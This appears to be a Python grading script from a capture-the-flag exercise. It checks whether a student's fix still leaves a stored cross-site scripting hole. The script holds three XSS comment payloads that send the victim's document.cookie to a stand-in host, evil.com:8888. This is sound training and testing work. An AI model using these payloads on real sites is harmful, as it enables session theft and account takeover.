import os
import subprocess

from shutil import copyfile


def run_cmd(cmd_list):
    child = subprocess.Popen(cmd_list, stdout=subprocess.PIPE)
    streamdata = child.communicate()[0]
    ret = child.returncode
    return streamdata.decode(), ret


def _map_correction_context():

    current_path = os.path.dirname(os.path.realpath(__file__))
    victim_browser_file = '{}/victim_browser.py'.format(current_path)
    copyfile('/srv/ctf_go/challs/stored_xss.dir/victim_browser.py', victim_browser_file)
    temp_db = os.path.join(current_path, "stored_xss.db")

    with open(victim_browser_file, "r") as f:
        content = f.read()
        new_content = content.replace("db_path=None", "db_path='{}'".format(temp_db))

    with open(victim_browser_file, "w") as f:
        f.write(new_content)


def exploit(binary, randomize):
    """
        Check if the corrected source code is still vulnerable
    """
    _map_correction_context()

    evil_comments = (
        """<script>document.write('<img src="http://evil.com:8888/test.gif?cookie=' + document.cookie + '" />')</script>""",
        """<script>img=new Image();img.src="http://evil.com:8888/monster.php?cookie="+document.cookie;</script>""",
        """<IMG SRC=/ onerror="img=new Image();img.src='http://evil.com:8888/aaaamonster.php?cookie='+document.cookie;">"""
    )

    user = 'debug'

    for comment in evil_comments:
        out, return_code = run_cmd((binary, user, comment))
        if return_code != 0:
            print("Invalid execution : {}".format(out))
            return True

        with open('/tmp/api.log') as f:
            logs = f.readlines()

        for line in logs:
            if all(k in line for k in (user, randomize)):
                print("I've got the secret ! {}".format(randomize))
                return True

    return False
